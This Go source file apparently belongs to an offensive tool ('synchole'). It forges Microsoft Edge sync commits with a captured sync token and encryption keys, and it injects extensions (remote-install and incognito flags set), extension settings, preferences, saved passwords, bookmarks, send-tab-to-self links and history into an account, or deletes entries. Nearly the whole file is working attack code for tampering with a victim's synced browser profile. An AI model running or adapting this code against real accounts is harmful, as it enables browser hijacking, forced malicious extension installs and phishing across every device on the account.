package sync

import (
	"synchole/syncproto"
	"encoding/base64"
	"errors"
	"fmt"
	"net/url"
	"regexp"
	"strconv"
	"strings"
	"time"

	"google.golang.org/protobuf/encoding/protowire"
	"google.golang.org/protobuf/proto"
)

func windowsEpochMicros() int64 {
	return time.Now().UnixMicro() + 11644473600000000
}

func markerFieldBytes(typeID int32) []byte {
	b := protowire.AppendTag(nil, protowire.Number(typeID), protowire.BytesType)
	return protowire.AppendBytes(b, []byte{})
}

func ClientTagHashFor(typeID int32, clientTag string) string {
	return GetSHA1(append(markerFieldBytes(typeID), []byte(clientTag)...))
}

func buildEncryptedEntryData(enc *syncproto.EncryptedData, typeID int32) ([]byte, error) {
	b, err := proto.Marshal(&syncproto.EncryptedProto{EncryptedData: enc})
	if err != nil {
		return nil, err
	}
	return append(b, markerFieldBytes(typeID)...), nil
}

const defaultEnvDef = "ProductionEnvironmentDefinition_1784265840897"

func newCommitMessage(idstring, cth string, data []byte, version int64, del bool, envdef, originatorGuid string) proto.Message {
	t := time.Now().UnixMilli()
	ver := version
	deleted := del
	if envdef == "" {
		envdef = defaultEnvDef
	}
	clientID := "XM1nwGWLXw20cLUU7N27rw=="
	cacheGuid := clientID
	if originatorGuid != "" {
		clientID = originatorGuid
		cacheGuid = originatorGuid
	}
	entry := &syncproto.Entry{
		Idstring:            []byte(idstring),
		Version:             &ver,
		Mtime:               &t,
		Ctime:               &t,
		HostnameOrEncrypted: []byte("encrypted"),
		Deleted:             &deleted,
		Data:                data,
		ClientTagHash:       []byte(cth),
		EdgeSyncEntity:      []byte{},
	}
	if originatorGuid != "" {
		entry.OriginatorCacheGuid = []byte(originatorGuid)
		entry.OriginatorClientItemId = []byte(idstring)
	}
	return &syncproto.RootMessage{
		ClientID:                        clientID,
		UnknownStatic1:                  99,
		UnknownStatic2:                  1,
		ProductionEnvironmentDefinition: envdef,
		ModifyRequest: &syncproto.ModifyRequest{
			Entries: []*syncproto.Entry{
				entry,
			},
			CacheGuid: []byte(cacheGuid),
		},
	}
}

func encryptSpecifics(specifics proto.Message, key, mackey []byte, keyname string) (*syncproto.EncryptedData, error) {
	plaintext, err := proto.Marshal(specifics)
	if err != nil {
		return nil, err
	}
	enc, err := EncryptMessageData(key, mackey, plaintext)
	if err != nil {
		return nil, err
	}
	return &syncproto.EncryptedData{
		CipherText: []byte(base64.StdEncoding.EncodeToString(enc)),
		KeyName:    []byte(keyname),
	}, nil
}

func GetWriteContext(msedgetoken, providedKeyName string) (keyname, envdef string, err error) {
	m := NewRandomSyncMessage([]int32{SYNC_TYPE_NIGORI})
	out, err := SyncRequest(m, msedgetoken)
	if err != nil {
		return "", "", err
	}
	var resp syncproto.SyncResponse
	if err := proto.Unmarshal(out, &resp); err != nil {
		return "", "", err
	}
	envdef = string(resp.ProductionEnvironmentDefinition)
	keyname = providedKeyName
	if keyname == "" {
		var entries []*syncproto.Entry
		if resp.NestedProtoField2 != nil {
			entries = append(entries, resp.NestedProtoField2.Entries...)
		}
		entries = append(entries, resp.Entries...)
		for _, e := range entries {
			if e == nil || len(e.Data) == 0 {
				continue
			}
			for _, candidate := range [][]byte{e.Data, trimProtoPrefix(e.Data)} {
				var sn syncproto.SyncNigori
				if uerr := proto.Unmarshal(candidate, &sn); uerr == nil &&
					sn.Nigori != nil && sn.Nigori.EncryptionKeybag != nil &&
					len(sn.Nigori.EncryptionKeybag.KeyName) > 0 {
					keyname = string(sn.Nigori.EncryptionKeybag.KeyName)
					break
				}
			}
			if keyname != "" {
				break
			}
		}
		if keyname == "" {
			return "", envdef, errors.New("could not locate Nigori encryption keybag key name")
		}
	}
	return keyname, envdef, nil
}

func trimProtoPrefix(b []byte) []byte {
	if len(b) > 5 && b[0] != 10 {
		return b[5:]
	}
	return b
}

func handleCommitResponse(out []byte) error {
	var resp syncproto.SyncResponse
	if err := proto.Unmarshal(out, &resp); err != nil {
		return err
	}
	if len(resp.Error) != 0 {
		fmt.Println("[-] ERROR: " + string(resp.Error))
		return nil
	}
	if len(resp.Entries) == 1 {
		DebugPrint(resp.Entries[0].String())
		s := resp.Entries[0].String()

		for _, seg := range splitStatus(s) {
			code, id := seg[0], seg[1]
			switch code {
			case "1":
				fmt.Println("[+] SUCCESS: " + id)
			case "2":
				fmt.Println("[!] COLLISION (version conflict — bump --version): " + id)
			default:
				fmt.Println("[-] FAILED (code " + code + "): " + id)
			}
		}
	}
	return nil
}

func GetEntryVersion(msedgetoken string, typeID int32, cth string) (version int64, ok bool, err error) {
	m := NewRandomSyncMessage([]int32{typeID})
	out, err := SyncRequest(m, msedgetoken)
	if err != nil {
		return 0, false, err
	}
	var resp syncproto.SyncResponse
	if err := proto.Unmarshal(out, &resp); err != nil {
		return 0, false, err
	}
	var entries []*syncproto.Entry
	if resp.NestedProtoField2 != nil {
		entries = append(entries, resp.NestedProtoField2.Entries...)
	}
	entries = append(entries, resp.Entries...)
	for _, e := range entries {
		if e != nil && e.Version != nil && string(e.ClientTagHash) == cth {
			return *e.Version, true, nil
		}
	}
	return 0, false, nil
}

var commitStatusRe = regexp.MustCompile(`2:(\d+)\s+3:"([^"]+)"`)

func splitStatus(s string) [][2]string {
	var out [][2]string
	for _, m := range commitStatusRe.FindAllStringSubmatch(s, -1) {
		out = append(out, [2]string{m[1], m[2]})
	}
	return out
}

const BookmarkBarGUID = "0bc5d13f-2cba-5d74-951f-3f233fe6c908"

const OtherBookmarksGUID = "82b081ec-3dd3-529c-8475-ab6c344590dd"

const defaultBookmarkPosition = "BdWUiUIE4nC5tR8oF/7A7FJnN7g="

const writeCacheGuid = "XM1nwGWLXw20cLUU7N27rw=="

func newBookmarkCommitMessage(guid, cth string, data, field25 []byte, version int64, del bool, envdef string) proto.Message {
	t := time.Now().UnixMilli()
	ver := version
	deleted := del
	folder := false
	if envdef == "" {
		envdef = defaultEnvDef
	}
	edgeEntity := protowire.AppendVarint(protowire.AppendTag(nil, 1, protowire.VarintType), uint64(windowsEpochMicros()))
	return &syncproto.RootMessage{
		ClientID:                        writeCacheGuid,
		UnknownStatic1:                  99,
		UnknownStatic2:                  1,
		ProductionEnvironmentDefinition: envdef,
		ModifyRequest: &syncproto.ModifyRequest{
			Entries: []*syncproto.Entry{
				{
					Idstring:               []byte(guid),
					Version:                &ver,
					Mtime:                  &t,
					Ctime:                  &t,
					HostnameOrEncrypted:    []byte("encrypted"),
					Deleted:                &deleted,
					OriginatorCacheGuid:    []byte(writeCacheGuid),
					OriginatorClientItemId: []byte(guid),
					Data:                   data,
					Folder:                 &folder,
					ClientTagHash:          []byte(cth),
					Field25:                field25,
					EdgeSyncEntity:         edgeEntity,
				},
			},
			CacheGuid: []byte(writeCacheGuid),
		},
	}
}

func AddBookmarkSyncRequest(msedgetoken, keyname, envdef string, key, mackey []byte, name, url, guid, parentGuid string, version int64, del bool) error {
	if guid == "" {
		guid, _ = RandomGUID()
	}
	if parentGuid == "" {
		parentGuid = BookmarkBarGUID
	}
	pos, _ := base64.StdEncoding.DecodeString(defaultBookmarkPosition)
	position := &syncproto.Token{EncodedBlob: pos}
	bm := &syncproto.SyncBookmark{
		Bookmark: &syncproto.Bookmark{
			Url:       []byte(url),
			Name:      []byte(name),
			NumericId: uint64(windowsEpochMicros()),
			Guid1:     []byte(guid),
			Name2:     []byte(name),
			Guid2:     []byte(parentGuid),
			Field15:   1,
			Token:     position,
			Field1000: 1,
			Field1001: 2,
		},
	}
	enc, err := encryptSpecifics(bm, key, mackey, keyname)
	if err != nil {
		return err
	}
	data, err := buildEncryptedEntryData(enc, SYNC_TYPE_BOOKMARKS)
	if err != nil {
		return err
	}
	field25, err := proto.Marshal(position)
	if err != nil {
		return err
	}
	cth := ClientTagHashFor(SYNC_TYPE_BOOKMARKS, guid)
	m := newBookmarkCommitMessage(guid, cth, data, field25, version, del, envdef)
	fmt.Println("[*] Writing bookmark  guid=" + guid + "  parent=" + parentGuid + "  cth=" + cth)
	out, err := SyncRequest(m, msedgetoken)
	if err != nil {
		return err
	}
	return handleCommitResponse(out)
}

func AddSendTabSyncRequest(msedgetoken, keyname, envdef string, key, mackey []byte, title, url, senderName, senderGuid, targetGuid, guid string, version int64, del bool) error {

	if guid == "" {
		guid, _ = RandomGUID()
	}
	now := windowsEpochMicros()
	stt := &syncproto.SyncSendTabToSelf{
		SendTabToSelf: &syncproto.SendTabToSelfSpecifics{
			Title:                     []byte(title),
			Url:                       []byte(url),
			SharedTimeUsec:            now,
			DeviceName:                []byte(senderName),
			Guid:                      []byte(guid),
			TargetDeviceSyncCacheGuid: []byte(targetGuid),
		},
	}
	enc, err := encryptSpecifics(stt, key, mackey, keyname)
	if err != nil {
		return err
	}
	data, err := buildEncryptedEntryData(enc, SYNC_TYPE_SEND_TAB_TO_SELF)
	if err != nil {
		return err
	}
	cth := ClientTagHashFor(SYNC_TYPE_SEND_TAB_TO_SELF, guid)
	m := newCommitMessage(guid, cth, data, version, del, envdef, senderGuid)
	fmt.Println("[*] Writing send-tab  guid=" + guid + "  sender=" + senderGuid + "  target=" + targetGuid + "  cth=" + cth)
	out, err := SyncRequest(m, msedgetoken)
	if err != nil {
		return err
	}
	return handleCommitResponse(out)
}

const DefaultExtensionUpdateURL = "https://edge.microsoft.com/extensionwebstorebase/v1/crx"

func AddExtensionSyncRequest(msedgetoken, keyname, envdef string, key, mackey []byte, extensionid, extensionversion, updateURL string, incognito, remoteInstall bool, objid string, del bool, version int) error {
	if updateURL == "" {
		updateURL = DefaultExtensionUpdateURL
	}
	cth := ClientTagHashFor(SYNC_TYPE_EXTENSIONS, extensionid)
	if version == 0 && objid == "" {
		if v, ok, _ := GetEntryVersion(msedgetoken, SYNC_TYPE_EXTENSIONS, cth); ok {
			version = int(v)
			DebugPrint("[*] Updating existing extension entry (base version " + strconv.Itoa(version) + ")")
		}
	}
	enabled := true
	disableReasons := false
	ext := &syncproto.SyncExtension{
		Extension: &syncproto.Extension{
			ExtensionId:      []byte(extensionid),
			Version:          []byte(extensionversion),
			UpdateUrl:        []byte(updateURL),
			Enabled:          &enabled,
			IncognitoEnabled: &incognito,
			RemoteInstall:    &remoteInstall,
			DisableReasons1:  &disableReasons,
		},
	}
	enc, err := encryptSpecifics(ext, key, mackey, keyname)
	if err != nil {
		return err
	}
	data, err := buildEncryptedEntryData(enc, SYNC_TYPE_EXTENSIONS)
	if err != nil {
		return err
	}
	guid := objid
	if guid == "" {
		guid, _ = RandomGUID()
	}
	m := newCommitMessage(guid, cth, data, int64(version), del, envdef, "")
	fmt.Println("[*] Writing extension  id=" + extensionid + "  cth=" + cth)
	out, err := SyncRequest(m, msedgetoken)
	if err != nil {
		return err
	}
	return handleCommitResponse(out)
}

func AddExtensionSettingsSyncRequest(msedgetoken, keyname, envdef string, key, mackey []byte, extensionid, variablename, variablevalue string) error {
	setting := &syncproto.SyncExtensionSetting{
		Extensionsetting: &syncproto.ExtensionSetting{
			ExtensionID: []byte(extensionid),
			VarName:     []byte(variablename),
			VarValue:    []byte(variablevalue),
		},
	}
	enc, err := encryptSpecifics(setting, key, mackey, keyname)
	if err != nil {
		return err
	}
	data, err := buildEncryptedEntryData(enc, SYNC_TYPE_EXTENSION_SETTINGS)
	if err != nil {
		return err
	}
	cth := ClientTagHashFor(SYNC_TYPE_EXTENSION_SETTINGS, extensionid+"/"+variablename)
	guid, _ := RandomGUID()
	m := newCommitMessage(guid, cth, data, 0, false, envdef, "")
	fmt.Println("[*] Writing extension setting  ext=" + extensionid + "  name=" + variablename + "  cth=" + cth)
	out, err := SyncRequest(m, msedgetoken)
	if err != nil {
		return err
	}
	return handleCommitResponse(out)
}

func AddPreferenceSyncRequest(msedgetoken, keyname, envdef string, key, mackey []byte, name, value string) error {
	pref := &syncproto.SyncPreference{
		Preference: &syncproto.Preference{
			Name:  []byte(name),
			Value: []byte(value),
		},
	}
	enc, err := encryptSpecifics(pref, key, mackey, keyname)
	if err != nil {
		return err
	}
	data, err := buildEncryptedEntryData(enc, SYNC_TYPE_PREFERENCE)
	if err != nil {
		return err
	}
	cth := ClientTagHashFor(SYNC_TYPE_PREFERENCE, name)
	guid, _ := RandomGUID()
	m := newCommitMessage(guid, cth, data, 0, false, envdef, "")
	fmt.Println("[*] Writing preference  name=" + name + "  cth=" + cth)
	out, err := SyncRequest(m, msedgetoken)
	if err != nil {
		return err
	}
	return handleCommitResponse(out)
}

func passwordSignonRealm(rawURL string) string {
	u, err := url.Parse(rawURL)
	if err != nil || u.Scheme == "" {
		return rawURL
	}
	return u.Scheme + "://" + u.Host + "/"
}

func passwordClientTag(signonRealm, username string) string {
	encoded := strings.ReplaceAll(signonRealm, ":", "%3A")
	return encoded + "||" + username + "||" + encoded
}

func AddPasswordSyncRequest(msedgetoken, keyname, envdef string, key, mackey []byte, siteURL, username, password string) error {
	signonRealm := passwordSignonRealm(siteURL)

	sp := &syncproto.SyncPassword{
		Field1:      1,
		BaseUrl:     signonRealm,
		Urlwithpath: siteURL,
		Username:    username,
		Password:    password,
	}
	encPwd, err := encryptSpecifics(sp, key, mackey, keyname)
	if err != nil {
		return err
	}

	falseVal := false
	zeroVal := uint64(0)
	container := &syncproto.SyncPasswordContainer{
		EncryptedSyncPassword: encPwd,
		UnencryptedData: &syncproto.UnencryptedPasswordMetadata{
			Blacklisted:    &falseVal,
			Datelastused:   &zeroVal,
			Passwordissues: []byte{},
			Type:           3,
			Url:            []byte(signonRealm),
		},
	}
	containerBytes, err := proto.Marshal(container)
	if err != nil {
		return err
	}
	encmsg := &syncproto.EncryptedProto{Field45873: containerBytes}
	data, err := proto.Marshal(encmsg)
	if err != nil {
		return err
	}

	tag := passwordClientTag(signonRealm, username)
	cth := ClientTagHashFor(SYNC_TYPE_PASSWORDS, tag)
	guid, _ := RandomGUID()
	m := newCommitMessage(guid, cth, data, 0, false, envdef, "")
	fmt.Println("[*] Writing password  url=" + siteURL + "  user=" + username + "  cth=" + cth)
	out, err := SyncRequest(m, msedgetoken)
	if err != nil {
		return err
	}
	return handleCommitResponse(out)
}

func AddHistorySyncRequest(msedgetoken, envdef, siteURL, title, faviconURL string) error {
	visitTime := windowsEpochMicros()
	guid, _ := RandomGUID()

	if faviconURL == "" {
		u, err := url.Parse(siteURL)
		if err == nil && u.Scheme != "" {
			faviconURL = u.Scheme + "://" + u.Host + "/favicon.ico"
		}
	}

	sh := &syncproto.SyncHistory{
		History: &syncproto.History{
			VisitTime:           visitTime,
			OriginatorCacheGuid: []byte(writeCacheGuid),
			Urlinfo: &syncproto.ArticleInfo{
				Url:   []byte(siteURL),
				Title: []byte(title),
			},
			Field4: &syncproto.Metrics{
				Metric1: 1,
				Metric4: 1,
			},
			Field8:           1,
			RootTaskId:       visitTime,
			TaskId:           visitTime,
			Timestamp3:       18446744073709551615,
			HTTPResponseCode: 200,
			PageLanguage:     []byte("en"),
			FaviconUrl:       []byte(faviconURL),
		},
	}
	data, err := proto.Marshal(sh)
	if err != nil {
		return err
	}

	hostname := writeCacheGuid + "-" + siteURL
	cth := ClientTagHashFor(SYNC_TYPE_HISTORY, siteURL+"|"+strconv.FormatInt(visitTime, 10))

	t := time.Now().UnixMilli()
	ver := int64(0)
	deleted := false
	if envdef == "" {
		envdef = defaultEnvDef
	}
	m := &syncproto.RootMessage{
		ClientID:                        writeCacheGuid,
		UnknownStatic1:                  99,
		UnknownStatic2:                  1,
		ProductionEnvironmentDefinition: envdef,
		ModifyRequest: &syncproto.ModifyRequest{
			Entries: []*syncproto.Entry{
				{
					Idstring:            []byte(guid),
					Mtime:               &t,
					Ctime:               &t,
					Version:             &ver,
					HostnameOrEncrypted: []byte(hostname),
					Deleted:             &deleted,
					Data:                data,
					ClientTagHash:       []byte(cth),
					EdgeSyncEntity:      []byte(""),
				},
			},
			CacheGuid: []byte(writeCacheGuid),
		},
	}

	fmt.Println("[*] Writing history  url=" + siteURL + "  cth=" + cth)
	out, err := SyncRequest(m, msedgetoken)
	if err != nil {
		return err
	}
	return handleCommitResponse(out)
}

func DeleteSyncRequest(msedgetoken, cth, objid, envdef string, version int) error {
	emptyEnc := &syncproto.EncryptedData{CipherText: []byte{}, KeyName: []byte{}}
	emptyMsg := &syncproto.EncryptedProto{EncryptedData: emptyEnc, Field96159: []byte{}}
	data, err := proto.Marshal(emptyMsg)
	if err != nil {
		return err
	}
	m := newCommitMessage(objid, cth, data, int64(version), true, envdef, "")
	fmt.Println("[*] Deleting entry  id=" + objid + "  cth=" + cth)
	out, err := SyncRequest(m, msedgetoken)
	if err != nil {
		return err
	}
	return handleCommitResponse(out)
}
